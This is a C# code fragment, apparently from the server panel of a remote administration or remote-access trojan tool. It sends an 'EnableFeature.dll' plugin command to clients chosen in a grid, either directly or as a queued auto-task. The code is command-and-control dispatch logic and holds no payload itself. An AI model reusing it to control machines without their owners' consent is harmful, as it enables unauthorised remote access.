	private void AttachEnableFeatureHandlers(ToolStripItem item)
	{
		if (!(item is ToolStripMenuItem menuItem))
		{
			return;
		}
		if (menuItem.Text == "Enable" || menuItem.Text == "Disable")
		{
			menuItem.Click += EnableFeature_Click;
		}
		foreach (ToolStripItem subItem in menuItem.DropDownItems)
		{
			AttachEnableFeatureHandlers(subItem);
		}
	}

	private void EnableFeature_Click(object sender, EventArgs e)
	{
		if (!(sender is ToolStripMenuItem menuItem))
		{
			return;
		}
		bool enable = menuItem.Text == "Enable";
		if (menuItem.OwnerItem is ToolStripMenuItem { Text: var featureName })
		{
			bool isTaskTab = false;
			ToolStripItem topItem = menuItem;
			while (topItem.OwnerItem != null)
			{
				topItem = topItem.OwnerItem;
			}
			if (topItem.Owner != null && (topItem.Owner.Name == "contextMenuStrip3" || topItem.Owner == contextMenuStrip3))
			{
				isTaskTab = true;
			}
			if (isTaskTab)
			{
				SendEnableFeatureTask(featureName, enable);
			}
			else
			{
				SendEnableFeature(featureName, enable);
			}
		}
	}

	private Control GetSourceControl(ToolStrip toolStrip)
	{
		if (toolStrip is ContextMenuStrip cms)
		{
			return cms.SourceControl;
		}
		return null;
	}

	private void SendEnableFeatureTask(string featureName, bool enable)
	{
		string checksum = Methods.GetChecksum("Plugin\\EnableFeature.dll");
		byte[] pack = LEB128.Write(new object[2] { featureName, enable });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, pack };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_EnableFeature_" + featureName + "_" + (enable ? "On" : "Off");
		AutoTaskMgr.AppendTask(task);
		AutoTaskMgr.Export();
	}

	private void SendEnableFeature(string featureName, bool enable)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\EnableFeature.dll");
		byte[] pack = LEB128.Write(new object[2] { featureName, enable });
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				Methods.AppendLogs(clients.IP, "Send plugin: EnableFeature.dll for " + featureName + " (" + (enable ? "Enable" : "Disable") + ")", Color.Blue);
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

